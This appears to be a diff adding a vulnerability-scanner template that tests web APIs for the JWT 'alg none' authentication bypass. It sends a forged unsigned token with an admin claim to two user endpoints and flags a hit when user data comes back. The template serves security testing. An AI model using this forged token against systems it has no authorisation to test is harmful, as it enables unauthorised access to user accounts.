@@ -1,0 +1,31 @@
+id: whai-jwt-alg-none
+
+info:
+  name: JWT Algorithm None Bypass
+  author: whitehat-ai
+  severity: critical
+  description: Tests for JWT algorithm none vulnerability
+  tags: jwt,auth,critical
+  classification:
+    cwe-id: CWE-327
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/api/me"
+      - "{{BaseURL}}/api/user"
+
+    headers:
+      Authorization: "Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWUsImlhdCI6MTUxNjIzOTAyMn0."
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - '"name"'
+          - '"email"'
+        condition: or
